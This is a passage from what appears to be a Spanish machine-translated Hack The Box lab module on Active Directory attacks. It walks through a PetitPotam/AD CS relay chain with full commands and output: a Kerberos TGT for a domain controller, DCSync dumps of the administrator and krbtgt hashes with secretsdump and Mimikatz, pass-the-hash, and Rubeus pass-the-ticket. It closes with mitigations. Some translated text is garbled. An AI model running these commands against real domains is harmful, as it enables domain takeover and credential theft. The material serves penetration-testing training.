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
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed

<SNIP>
```

#### Solicitar un TGT usando gettgtpkinit.py

A continuación, podemos tomar este certificado Base64 y usar`gettgtpkinit.py`Para solicitar un boleto de devolución de boletos (TGT) para el controlador de dominio.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### Configuración de la variable de entorno KRB5CCName

El TGT solicitado anteriormente se guardó hasta el`dc01.ccache`Archivo que usamos para establecer la variable de entorno KRB5CCNAME, por lo que nuestro host de ataque utiliza este archivo para los intentos de autenticación de Kerberos.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```

#### Uso del controlador de dominio TGT a DCSYNC

Entonces podemos usar este TGT con`secretsdump.py`Para realizar un DCSYNC y recuperar uno o todos los hash de contraseña NTLM para el dominio.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up... 
```

También podríamos usar un comando más directo:`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`Porque la herramienta recuperará el nombre de usuario del archivo ccache. Podemos ver esto escribiendo`klist`(Usando el`klist`El comando requiere la instalación del[usador de KRB5](https://packages.ubuntu.com/focal/krb5-user)Paquete en nuestro host de ataque. Esto se instala en Attack01 en el laboratorio ya).

#### Corriendo Klist

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

#### Confirmando el acceso de administrador al controlador de dominio

Finalmente, podríamos usar el hash NT para la cuenta de administrador incorporada para autenticarse en el controlador de dominio. Desde aquí, tenemos un control completo sobre el dominio y podríamos buscar establecer persistencia, buscar datos confidenciales, buscar otras configuraciones erróneas y vulnerabilidades para nuestro informe, o comenzar a enumerar las relaciones de confianza.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

#### Enviar una solicitud TGS para nosotros usando getnthash.py

También podemos tomar una ruta alternativa una vez que tengamos el TGT para nuestro objetivo. Usando la herramienta`getnthash.py`Desde PkinitTools podríamos solicitar el hash NT para nuestro host/usuario objetivo utilizando Kerberos U2U para enviar una solicitud TGS con el[Certificado de atributo privilegiado (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/)que contiene el hash NT para el objetivo. Esto se puede descifrar con la clave de cifrado AS-REP que obtuvimos al solicitar el TGT antes.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

Luego podemos usar este hash para realizar un DCSYNC con secretsdump.py usando el`-hashes`bandera.

#### Uso del controlador de dominio NTLM hash a DCSYNC

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

Alternativamente, una vez que obtengamos el certificado Base64 a través de ntlmrelayx.py, podríamos usar el certificado con la herramienta Rubeus en un host de ataque de Windows para solicitar un boleto TGT y realizar un ataque de pase de boletos (PTT) de una vez.

Nota: necesitaríamos usar el`MS01`atacar al anfitrión en otra sección, como el`ACL Abuse Tactics`o`Privileged Access`Sección Una vez que tengamos el certificado Base64 guardado en nuestras notas para realizar esto usando Rubeus.

#### Solicitar TGT y realizar PTT con una cuenta de máquina DC01 $

  Vulnerabilidades de borde sangrado

```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
 doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  ACADEMY-EA-DC01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/30/2022 3:50:25 PM
  EndTime                  :  3/31/2022 1:50:25 AM
  RenewTill                :  4/6/2022 3:50:25 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
```

Entonces podemos escribir`klist`Para confirmar que el boleto está en memoria.

#### Confirmar que el boleto está en memoria

  Vulnerabilidades de borde sangrado

```powershell-session
PS C:\Tools> klist

Current LogonId is 0:0x4e56b

Cached Tickets: (3)

#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/30/2022 15:50:25 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Una vez más, dado que los controladores de dominio tienen privilegios de replicación en el dominio, podemos usar el pase-the-ticket para realizar un ataque DCSYNC usando Mimikatz de nuestro host de ataque de Windows. Aquí, tomamos el hash NT para la cuenta KRBTGT, que podría usarse para crear un boleto de oro y establecer persistencia. Podríamos obtener el hash NT para cualquier usuario privilegiado que use DCSYNC y avanzar a la siguiente fase de nuestra evaluación.

#### Realización de DCSync con Mimikatz

  Vulnerabilidades de borde sangrado

```powershell-session
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'inlanefreight\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/27/2021 8:14:34 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
    lm  - 0: 4562458c201a97fa19365ce901513c21
```

---

## Mitigaciones petitpotam

En primer lugar, el parche para[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)debe aplicarse a cualquier anfitrión afectado. A continuación se presentan algunos pasos de endurecimiento más que se pueden tomar:

- Para evitar ataques de retransmisión NTLM, use[Protección extendida para la autenticación](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811)junto con habilitación[Requiere SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)Para permitir solo las conexiones HTTPS para los servicios de servicio web de inscripción web y inscripción web de la autoridad certificada
- [Desactivar la autenticación NTLM](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)para controladores de dominio
- Desactivar NTLM en servidores AD CS usando[Política grupal](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Deshabilitar NTLM para IIS en servidores AD CS donde los servicios de servicio web de inscripción web y inscripción web de la autoridad de certificado están en uso

Para una lectura más sobre el ataque de los servicios de certificado de Active Directory, recomiendo el documento técnico[Certificado de propiedad de propiedad](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)Como esto demuestra ataques contra AD CS que se pueden realizar utilizando llamadas API autenticadas. Esto muestra que solo aplicar el parche CVE-2021-36942 solo para mitigar Petitpotam no es suficiente para la mayoría de las organizaciones que ejecutan AD CS, porque un atacante con credenciales de usuario de dominio estándar aún puede realizar ataques contra AD CS en muchos casos. El documento técnico también detalla otros pasos de endurecimiento y detección que se pueden tomar para endurecer anuncios.

---

## Resumen

En esta sección cubrimos tres ataques recientes:

- NOPAC (SamaccountName Spoofing)
- Printnightmare (de forma remota)
- Petitpotam (MS-EFSRPC)

Cada uno de estos ataques se puede realizar con acceso al usuario de dominio estándar (NOPAC y PrintnightMare) o sin ningún tipo de autenticación para el dominio (petitpotam), y puede conducir a un compromiso de dominio relativamente fácilmente. Hay múltiples formas de realizar cada ataque, y cubrimos algunas. Los ataques de Active Directory continúan evolucionando, y estos seguramente no son los últimos vectores de ataque de impacto extremadamente alto que veremos. Cuando se liberan estos tipos de ataques, debemos esforzarnos por construir un entorno de laboratorio pequeño para practicarlos, por lo que estamos listos para usarlos de manera segura y efectiva en un compromiso del mundo real en caso de que surja la oportunidad. Comprender cómo establecer estos ataques en un laboratorio también puede aumentar significativamente nuestra comprensión del problema y ayudarnos a asesorar mejor a nuestros clientes sobre el impacto, la remediación y las detecciones. Esto fue solo un pequeño vistazo al mundo de atacar anuncios, que podría ser un módulo completo.

En la siguiente sección, hablaremos sobre otros problemas que vemos de vez en cuando en entornos de Active Directory que podrían ayudarnos a promover nuestro acceso o conducir a hallazgos adicionales para nuestro informe final del cliente.